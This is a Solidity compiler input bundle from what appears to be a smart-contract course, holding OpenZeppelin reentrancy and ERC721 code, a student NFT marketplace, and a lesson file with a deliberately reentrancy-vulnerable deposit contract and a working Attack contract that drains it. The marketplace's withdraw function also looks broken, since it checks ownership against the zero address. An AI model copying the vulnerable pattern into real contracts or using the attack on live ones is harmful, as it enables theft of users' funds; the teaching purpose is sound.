{
  "language": "Solidity",
  "sources": {
    "@openzeppelin/contracts/security/ReentrancyGuard.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (security/ReentrancyGuard.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Contract module that helps prevent reentrant calls to a function.\n *\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n * available, which can be applied to functions to make sure there are no nested\n * (reentrant) calls to them.\n *\n * Note that because there is a single `nonReentrant` guard, functions marked as\n * `nonReentrant` may not call one another. This can be worked around by making\n * those functions `private`, and then adding `external` `nonReentrant` entry\n * points to them.\n *\n * TIP: If you would like to learn more about reentrancy and alternative ways\n * to protect against it, check out our blog post\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\n */\nabstract contract ReentrancyGuard {\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n\n    uint256 private _status;\n\n    constructor() {\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        _nonReentrantBefore();\n        _;\n        _nonReentrantAfter();\n    }\n\n    function _nonReentrantBefore() private {\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n\n        // Any calls to nonReentrant after this point will fail\n        _status = _ENTERED;\n    }\n\n    function _nonReentrantAfter() private {\n        // By storing the original value once again, a refund is triggered (see\n        // https://eips.ethereum.org/EIPS/eip-2200)\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Returns true if the reentrancy guard is currently set to \"entered\", which indicates there is a\n     * `nonReentrant` function in the call stack.\n     */\n    function _reentrancyGuardEntered() internal view returns (bool) {\n        return _status == _ENTERED;\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC721/IERC721.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC721/IERC721.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../../utils/introspection/IERC165.sol\";\n\n/**\n * @dev Required interface of an ERC721 compliant contract.\n */\ninterface IERC721 is IERC165 {\n    /**\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n     */\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n     */\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    /**\n     * @dev Returns the number of tokens in ``owner``'s account.\n     */\n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    /**\n     * @dev Returns the owner of the `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n\n    /**\n     * @dev Transfers `tokenId` token from `from` to `to`.\n     *\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 tokenId) external;\n\n    /**\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n     * The approval is cleared when the token is transferred.\n     *\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n     *\n     * Requirements:\n     *\n     * - The caller must own the token or be an approved operator.\n     * - `tokenId` must exist.\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address to, uint256 tokenId) external;\n\n    /**\n     * @dev Approve or remove `operator` as an operator for the caller.\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n     *\n     * Requirements:\n     *\n     * - The `operator` cannot be the caller.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /**\n     * @dev Returns the account approved for `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    /**\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n     *\n     * See {setApprovalForAll}\n     */\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n}\n"
    },
    "@openzeppelin/contracts/utils/introspection/IERC165.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC165 standard, as defined in the\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\n *\n * Implementers can declare support of contract interfaces, which can then be\n * queried by others ({ERC165Checker}).\n *\n * For an implementation, see {ERC165}.\n */\ninterface IERC165 {\n    /**\n     * @dev Returns true if this contract implements the interface defined by\n     * `interfaceId`. See the corresponding\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n     * to learn more about how these ids are created.\n     *\n     * This function call must use less than 30 000 gas.\n     */\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n"
    },
    "contracts/NFTMarketplace.sol": {
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity ^0.8.7;\n\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n// What do we need to creat a NFT MarketPlace?\n\n// Main functions:\n// 1. 'ListItem' : lists NFTs on the marketplace\n// 2. 'buyItem' : buys NFTs from the marketplace\n// 3. 'cancelItem': cancels a listing\n// 4. 'updateListing': updates Price\n// 5. 'withdrawProceeds': withdraws proceeds from sales\n\nerror NftMarketplace__Price_Must_Be_Above_Zero();\nerror NftMarketplace__NFT_Not_Approved_For_Marketplace();\nerror NftMarketplace__NFT_Already_Listed(address nftAddress, uint256 tokenId);\nerror NftMarketplace__Seller_Not_NFT_Owner();\nerror NftMarketplace__NFT_Not_Listed(address nftAddress, uint256 tokenId);\nerror NftMarketplace__Price_Not_Met(\n    address nftAddress,\n    uint256 tokenId,\n    uint256 price\n);\nerror NftMarketplace__No_Proceeds_Available_To_Withdraw();\nerror NftMarketplace__Withdraw_Failed();\n\ncontract NFTMarketplace is ReentrancyGuard {\n    ////////////////////\n    // Events       ///\n    ///////////////////\n\n    // We need a type of data structure to list all NFTs in the marketplace. A mapping (a global or state variable)\n    // NFT Contract Address -> NFT TokenID -> Listing\n    // 0x123... -> 1 -> {price: 100, seller: 0x123...}\n    // 0x123... -> 2 -> {price: 200, seller: 0x456...}\n    // 0x123... -> 3 -> {price: 300, seller: 0x789...}\n    struct Listing {\n        uint256 price;\n        address seller;\n    }\n    mapping(address => mapping(uint256 => Listing)) private s_listings;\n\n    // Seller address => Amount earned\n    mapping(address => uint256) private s_proceeds;\n\n    ////////////////////\n    // Events       ///\n    ///////////////////\n\n    event ItemListed(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    event ItemBought(\n        address indexed buyer,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    event ItemCancelled(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId\n    );\n    event ItemPriceUpdated(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n    event ProceedAmountWithdrawn(address indexed seller, uint256 amount);\n\n    ////////////////////\n    // Modifiers    ///\n    ///////////////////\n\n    modifier notListed(\n        address _nftAddress,\n        uint256 _tokenId,\n        address _seller\n    ) {\n        Listing memory listing = s_listings[_nftAddress][_tokenId];\n        if (listing.price > 0) {\n            revert NftMarketplace__NFT_Already_Listed(_nftAddress, _tokenId);\n        }\n        _;\n    }\n\n    modifier isOwner(\n        address _nftAddress,\n        uint256 _tokenId,\n        address _seller\n    ) {\n        IERC721 nft = IERC721(_nftAddress);\n        address owner = nft.ownerOf(_tokenId);\n        if (_seller != owner) {\n            revert NftMarketplace__Seller_Not_NFT_Owner();\n        }\n        _;\n    }\n\n    modifier isListed(address _nftAddress, uint256 _tokenId) {\n        Listing memory listing = s_listings[_nftAddress][_tokenId];\n        if (listing.price <= 0) {\n            revert NftMarketplace__NFT_Not_Listed(_nftAddress, _tokenId);\n        }\n        _;\n    }\n\n    ////////////////////\n    // Main Function //\n    ///////////////////\n\n    /*\n     * @notice Method for Listing your NFT on the marketplace\n     * @param _nftAddress: Address of the NFT contract\n     * @param _tokenId: Token ID of the NFT\n     * @param _price: Price of the NFT\n     * @dev Tchnically, we could have the contract be the escrow for the NFTs\n     * but this way peeople can still hold on to their NFTs when they list them.\n     */\n\n    function listItem(\n        address _nftAddress,\n        uint256 _tokenId,\n        uint256 _price\n    )\n        external\n        notListed(_nftAddress, _tokenId, msg.sender)\n        isOwner(_nftAddress, _tokenId, msg.sender)\n    {\n        // 1. Check if the sender is the owner of the NFT\n        // 2. Transfer the NFT to the marketplace\n        // 3. Add the item to the mapping\n        // 4. Emit the event\n\n        if (_price <= 0) {\n            revert NftMarketplace__Price_Must_Be_Above_Zero();\n        }\n\n        // Tow solutions:\n        // 1. Send the NFT to the contract. Transfer -> Contract (MarketPlace)\"hold\" the NFT\n        // 2. Owners can hold  on to their NFT, and gives the marketplacr approval\n        // to transfer the NFT on their behalf\n\n        IERC721 nft = IERC721(_nftAddress); // Wrap the NFT contract in an interface\n\n        // Check this marketplace (this contract being developped) has the necessary approval to transfer the NFT with the given tokenId ?\n        // (In the past, NFT owner has already used the NFT contract's \"Approve()\" function to grant the marketplace contract the approval to transfer the NFT)\n\n        if (nft.getApproved(_tokenId) != address(this)) {\n            // address(this) is alwaysthe address of the contract being developed\n            revert NftMarketplace__NFT_Not_Approved_For_Marketplace();\n        }\n\n        s_listings[_nftAddress][_tokenId] = Listing(_price, msg.sender);\n        emit ItemListed(msg.sender, _nftAddress, _tokenId, _price);\n    }\n\n    /*\n     * @notice Method for buying an NFT from the marketplace\n     * @param _nftAddress: Address of the NFT contract\n     * @param _tokenId: Token ID of the NFT\n     * @dev Tchnically, we could have the contract be the escrow for the NFTs\n     * but this way peeople can still hold on to their NFTs when they list them.\n     */\n    function buyItem(\n        address _nftAddress,\n        uint256 _tokenId\n    ) external payable nonReentrant isListed(_nftAddress, _tokenId) {\n        // payable permits contracts from outside to pay with layer 1 token on this marketplace\n        // 1. Check if the NFT is listed\n        // 2. Check if the price is correct\n        // 3. Transfer the NFT to the buyer\n        // 4. Transfer the funds to the seller\n        // 5. Remove the listing\n\n        Listing memory listedItem = s_listings[_nftAddress][_tokenId];\n        if (msg.value < listedItem.price) {\n            revert NftMarketplace__Price_Not_Met(\n                _nftAddress,\n                _tokenId,\n                listedItem.price\n            );\n        }\n        // We don't just send the selller the money...?\n        // https://fravoll.github.io/solidity-patterns/pull_over_push.html\n\n        // sending the money to user NOT SAFE\n        // Have them withdraw the money\n        s_proceeds[listedItem.seller] += msg.value;\n        delete (s_listings[_nftAddress][_tokenId]); // remove the listing from the mapping\n        IERC721(_nftAddress).safeTransferFrom(\n            listedItem.seller, // the seller of the item\n            msg.sender, // te buyer of the item (the outside contract communicating with this contract)\n            _tokenId\n        );\n        emit ItemBought(msg.sender, _nftAddress, _tokenId, listedItem.price);\n    }\n\n    /*\n     * @notice Method for Cancelling an NFT listing on the marketplace\n     * @param _nftAddress: Address of the NFT contract\n     * @param _tokenId: Token ID of the NFT\n     * @dev\n     */\n\n    function cancelListing(\n        address _nftAddress,\n        uint256 _tokenId\n    )\n        external\n        isOwner(_nftAddress, _tokenId, msg.sender)\n        isListed(_nftAddress, _tokenId)\n    {\n        delete (s_listings[_nftAddress][_tokenId]);\n        emit ItemCancelled(msg.sender, _nftAddress, _tokenId);\n    }\n\n    /*\n     * @notice Method for updating an NFT listing on the marketplace\n     * @dev\n     * @param _nftAddress: Address of the NFT contract\n     * @param _tokenId: Token ID of the NFT\n     * @param _newPrice: New price of the NFT\n     */\n\n    function updateListing(\n        address _nftAddress,\n        uint256 _tokenId,\n        uint256 _newPrice\n    )\n        external\n        payable\n        isOwner(_nftAddress, _tokenId, msg.sender)\n        isListed(_nftAddress, _tokenId)\n    {\n        s_listings[_nftAddress][_tokenId].price = _newPrice;\n        emit ItemPriceUpdated(msg.sender, _nftAddress, _tokenId, _newPrice);\n    }\n\n    /*\n     * @notice Method for withdrawing funds from the marketplace\n     * @dev\n     * @param _amount: Amount to withdraw\n     */\n\n    function withdrawProceeds()\n        external\n        payable\n        nonReentrant\n        isOwner(address(0), 0, msg.sender)\n    {\n        uint256 proceeds = s_proceeds[msg.sender];\n        if (proceeds <= 0) {\n            revert NftMarketplace__No_Proceeds_Available_To_Withdraw();\n        }\n        s_proceeds[msg.sender] = 0;\n        (bool success, ) = msg.sender.call{value: proceeds}(\"\");\n        if (!success) {\n            revert NftMarketplace__Withdraw_Failed();\n        } else {\n            emit ProceedAmountWithdrawn(msg.sender, proceeds);\n        }\n    }\n\n    ////////////////////\n    // Main Function //\n    ///////////////////\n\n    function getListing(\n        address _nftAddress,\n        uint256 _tokenId\n    ) external view returns (Listing memory) {\n        return s_listings[_nftAddress][_tokenId];\n    }\n\n    function getProceeds(address _seller) external view returns (uint256) {\n        return s_proceeds[_seller];\n    }\n}\n"
    },
    "contracts/sublesson/ReentrantVulnerable.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\n// Based on https://solidity-by-example.org/hacks/re-entrancy\n\n/*\nReentrantVulnerable is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy ReentrantVulnerable\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable\n3. Deploy Attack with address of ReentrantVulnerable\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call ReentrantVulnerable.withdraw multiple times before\nReentrantVulnerable.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- ReentrantVulnerable.deposit\n- ReentrantVulnerable.withdraw\n- Attack fallback (receives 1 Ether)\n- ReentrantVulnerable.withdraw\n- Attack.fallback (receives 1 Ether)\n- ReentrantVulnerable.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract ReentrantVulnerable {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    ReentrantVulnerable public reentrantVulnerable;\n\n    constructor(address _reentrantVulnerableAddress) {\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(reentrantVulnerable).balance >= 1 ether) {\n            reentrantVulnerable.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        reentrantVulnerable.deposit{value: 1 ether}();\n        reentrantVulnerable.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}